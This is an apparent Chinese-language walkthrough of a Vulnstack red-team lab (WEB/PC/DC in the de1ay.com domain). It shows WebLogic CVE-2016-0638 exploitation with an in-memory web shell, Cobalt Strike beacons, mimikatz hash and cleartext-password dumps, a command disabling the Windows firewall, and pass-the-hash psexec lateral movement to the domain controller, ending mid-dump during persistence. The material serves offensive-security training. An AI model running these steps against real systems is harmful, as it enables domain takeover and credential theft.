
**拓扑环境如下：**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/bef7b75eef14033f45e83eae60525f79.png" alt="bef7b75eef14033f45e83eae60525f79.png" width="577" height="408">**

**http://vulnstack.qiyuanxuetang.net/vuln/detail/3/**

#### **环境说明**

`内网网段：10.10.10.1/24`

`DMZ网段：192.168.111.1/24`

`测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）`

`防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：`

```
`deny all tcp ports：10.10.10.1
allow all tcp ports：10.10.10.0/24`
`PS：默认开机密码：1qaz@WSX，WEB 机密码默认错误，需要先普通用户登录 de1ay/1qaz@WSX，进入后然后使用管理员账户提权，web 机需要手动在 C:\Oracle\Middleware\user_projects\domains\base_domain 下的 startweblogic.bat 管理员权限开启`
```

#### **配置信息**

**DC**

`IP：10.10.10.10`

`OS：Windows 2012(64)`

`应用：AD域`

**WEB**

`IP1：10.10.10.80`

`IP2：192.168.111.80`

`OS：Windows 2008(64)`

`应用：Weblogic 10.3.6    MSSQL 2008`

**PC**

`IP1：10.10.10.201`

`IP2：192.168.111.201`

`OS：Windows 7(32)`

**攻击机**

`IP：192.168.111.30`

`OS：Kali`

* * *

## **主机发现**
### 使用nmap扫描网段

```
└─$ sudo nmap -sS -Pn -T4 192.168.111.0/24
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 04:55 EDT
Nmap scan report for 192.168.111.1
Host is up (0.027s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE  SERVICE
80/tcp closed http
MAC Address: 00:50:56:C0:00:03 (VMware)

Nmap scan report for 192.168.111.80
Host is up (0.0052s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
7001/tcp  open  afs3-callback
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49160/tcp open  unknown
MAC Address: 00:0C:29:2A:EE:99 (VMware)

Nmap scan report for 192.168.111.201
Host is up (0.026s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
MAC Address: 00:0C:29:85:D1:4D (VMware)

Nmap scan report for 192.168.111.30
Host is up (0.0034s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
6789/tcp open  ibm-db2-admin

Nmap done: 256 IP addresses (4 hosts up) scanned in 111.65 seconds
```

### 访问192.168.111.80的80端口发现是空白页面，访问7001端口发现是weblogic,使用工具检测相关漏洞：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821170045054.png)
### 发现存在cve_2016_0638（其实还有好几个，工具比较老其他的没检测出来）
### 写入冰蝎内存马，并成功连接
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821170239737.png)

## 内网渗透
### cs开启监听，并制作木马，通过冰蝎进行上传，成功获取到shell
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821170403051.png)

---
## 上线域控DC

### 加载mimikatz dump hash和密码
```shell
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82541 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:45a524862326cb9e7d85af4017a000f0:::
de1ay:1000:aad3b435b51404eeaad3b435b51404ee:3b24c391862f4a8531a245a0217708c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```shell

beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 297594 bytes
[+] received output:

Authentication Id : 0 ; 4446154 (00000000:0043d7ca)
Session           : RemoteInteractive from 1
User Name         : Administrator
Domain            : WEB
Logon Server      : WEB
Logon Time        : 2025/8/21 16:51:31
SID               : S-1-5-21-3767205380-3469466069-2137393323-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : WEB
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 45a524862326cb9e7d85af4017a000f0
	 * SHA1     : 9de837c08728a5a6bef9e4721964b15ca3ffd969
	tspkg :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	wdigest :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	kerberos :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	ssp :	
	credman :	

Authentication Id : 0 ; 4027902 (00000000:003d75fe)
Session           : CachedInteractive from 2
User Name         : Administrator
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/8/20 20:46:24
SID               : S-1-5-21-2756371121-2868759905-3853650604-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : Administrator
	 * Domain   : de1ay.com
	 * Password : 1qaz@WSX
	ssp :	
	credman :	

Authentication Id : 0 ; 2183568 (00000000:00215190)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2025/8/20 20:16:12
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : DE1AY
	 * NTLM     : 799225af512d82db605e224b29622bca
	 * SHA1     : a78068681c26bd5f83c9ad0a0f0b991803dc4840
	tspkg :	
	 * Username : WEB$
	 * Domain   : DE1AY
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	wdigest :	
	 * Username : WEB$
	 * Domain   : DE1AY
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	kerberos :	
	 * Username : WEB$
	 * Domain   : de1ay.com
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	ssp :	
	credman :	

Authentication Id : 0 ; 1416116 (00000000:00159bb4)
Session           : Interactive from 2
User Name         : de1ay
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/8/20 20:10:41
SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
	msv :	
	 [00000003] Primary
	 * Username : de1ay
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : de1ay
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : de1ay
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : de1ay
	 * Domain   : DE1AY.COM
	 * Password : 1qaz@WSX
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB$
Domain            : DE1AY
Logon Server      : (null)
Logon Time        : 2025/8/20 20:07:14
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : DE1AY
	 * NTLM     : 799225af512d82db605e224b29622bca
	 * SHA1     : a78068681c26bd5f83c9ad0a0f0b991803dc4840
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : DE1AY
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	kerberos :	
	 * Username : web$
	 * Domain   : DE1AY.COM
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	ssp :	
	credman :	

Authentication Id : 0 ; 50044 (00000000:0000c37c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2025/8/20 20:07:13
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : WEB$
	 * Domain   : DE1AY
	 * NTLM     : 799225af512d82db605e224b29622bca
	 * SHA1     : a78068681c26bd5f83c9ad0a0f0b991803dc4840
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 3801879 (00000000:003a0317)
Session           : CachedInteractive from 2
User Name         : Administrator
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/8/20 20:41:18
SID               : S-1-5-21-2756371121-2868759905-3853650604-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : Administrator
	 * Domain   : de1ay.com
	 * Password : 1qaz@WSX
	ssp :	
	credman :	

Authentication Id : 0 ; 3289401 (00000000:00323139)
Session           : Interactive from 2
User Name         : de1ay
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/8/20 20:34:25
SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
	msv :	
	 [00000003] Primary
	 * Username : de1ay
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : de1ay
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : de1ay
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : de1ay
	 * Domain   : DE1AY.COM
	 * Password : 1qaz@WSX
	ssp :	
	credman :	

Authentication Id : 0 ; 1657719 (00000000:00194b77)
Session           : Interactive from 1
User Name         : Administrator
Domain            : WEB
Logon Server      : WEB
Logon Time        : 2025/8/20 20:12:50
SID               : S-1-5-21-3767205380-3469466069-2137393323-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : WEB
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 45a524862326cb9e7d85af4017a000f0
	 * SHA1     : 9de837c08728a5a6bef9e4721964b15ca3ffd969
	tspkg :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	wdigest :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	kerberos :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	ssp :	
	credman :	

Authentication Id : 0 ; 638823 (00000000:0009bf67)
Session           : Interactive from 1
User Name         : Administrator
Domain            : WEB
Logon Server      : WEB
Logon Time        : 2025/8/20 20:08:55
SID               : S-1-5-21-3767205380-3469466069-2137393323-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : WEB
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 45a524862326cb9e7d85af4017a000f0
	 * SHA1     : 9de837c08728a5a6bef9e4721964b15ca3ffd969
	tspkg :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	wdigest :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	kerberos :	
	 * Username : Administrator
	 * Domain   : WEB
	 * Password : 1qaz@wsx
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2025/8/20 20:08:08
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 169087 (00000000:0002947f)
Session           : Service from 0
User Name         : mssql
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/8/20 20:07:28
SID               : S-1-5-21-2756371121-2868759905-3853650604-2103
	msv :	
	 [00000003] Primary
	 * Username : mssql
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : mssql
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : mssql
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : mssql
	 * Domain   : DE1AY.COM
	 * Password : 1qaz@WSX
	ssp :	
	credman :	

Authentication Id : 0 ; 133427 (00000000:00020933)
Session           : Service from 0
User Name         : mssql
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2025/8/20 20:07:15
SID               : S-1-5-21-2756371121-2868759905-3853650604-2103
	msv :	
	 [00000003] Primary
	 * Username : mssql
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : mssql
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : mssql
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : mssql
	 * Domain   : DE1AY.COM
	 * Password : 1qaz@WSX
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2025/8/20 20:07:14
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB$
Domain            : DE1AY
Logon Server      : (null)
Logon Time        : 2025/8/20 20:07:13
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WEB$
	 * Domain   : DE1AY
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	kerberos :	
	 * Username : web$
	 * Domain   : DE1AY.COM
	 * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 
	ssp :	
	credman :	
```

### 执行net view,发现6118报错
```shell
beacon> net view
[*] Tasked beacon to run net view
[+] host called home, sent: 105057 bytes
[+] received output:
List of hosts:


[+] received output:
 Server Name             IP Address                       Platform  Version  Type   Comment
 -----------             ----------                       --------  -------  ----   -------
[-] Error: 6118
```
### 使用`shell netsh advfirewall set allprofiles state off`关闭防火墙后再次执行net view
```shell
beacon> shell netsh advfirewall set allprofiles state off
[*] Tasked beacon to run: netsh advfirewall set allprofiles state off
[+] host called home, sent: 74 bytes
[+] received output:
确定。
```

```shell
beacon> net view
[*] Tasked beacon to run net view
[+] host called home, sent: 105057 bytes
[+] received output:
List of hosts:

 Server Name             IP Address                       Platform  Version  Type   Comment
 -----------             ----------                       --------  -------  ----   -------
 DC                      10.10.10.10                      500       6.3      PDC    
 WEB                     192.168.111.80                   500       6.1             

```

### 点击`show targets in table view`按钮，查看域主机信息
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821171225769.png)

### 选择10.10.10.10，右键点击jump -> psexec,选择hash,然后创建一个smb监听从10.10.10.80作为跳板传回来的session
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821195545576.png)

### 成功上线域控DC
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821195728676.png)

---
## 横向渗透
### 扫描192.168.111.201
```shell
└─$ nmap -sS -Pn -T4 -sV 192.168.111.201 --script=vuln
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 07:14 EDT
Nmap scan report for 192.168.111.201
Host is up (0.075s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:85:D1:4D (VMware)
Service Info: Host: PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:                                                                             
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)               
|     State: VULNERABLE                                                                     
|     IDs:  CVE:CVE-2017-0143                                                               
|     Risk factor: HIGH                                                                     
|       A critical remote code execution vulnerability exists in Microsoft SMBv1            
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.05 seconds
                                                               
```
### 发现可能存在ms17-010,使用msf `auxiliary/scanner/smb/smb_ms17_010`进行检测
```shell
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 192.168.111.201:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.111.201:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
### 确认存在ms17-010，尝试利用msf 进行漏洞攻击，尝试多个利用方式都失败

### 在DC的session中执行`portscan 10.10.10.0/24 445 arp 200`,终于扫描到10.10.10.201（也就是PC）
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821200307660.png)
### 同样利用psexec 进行哈希传递，上线PC
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821200522143.png)
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821200557917.png)
### 目前为止，所有域主机均已上线
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250821200646392.png)

---
## 权限维持
### 获取域控hash与密码
```shell
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82541 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:199cdf7694740292f436cc51b09f9355:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:ce3e307123b59b4c481286308ae8fc2b:::
WEB$:1603:aad3b435b51404eeaad3b435b51404ee:73805069e2c7227f110772875f1b0e41:::

beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 297594 bytes
[+] received output:

Authentication Id : 0 ; 76818 (00000000:00012c12)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2025/8/21 19:35:39
SID               : S-1-5-90-1
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : DE1AY
	 * NTLM     : 199cdf7694740292f436cc51b09f9355
	 * SHA1     : 2e173066a861825d5dc67a4a7a57c696a7c14f7d
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : DE1AY
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : de1ay.com
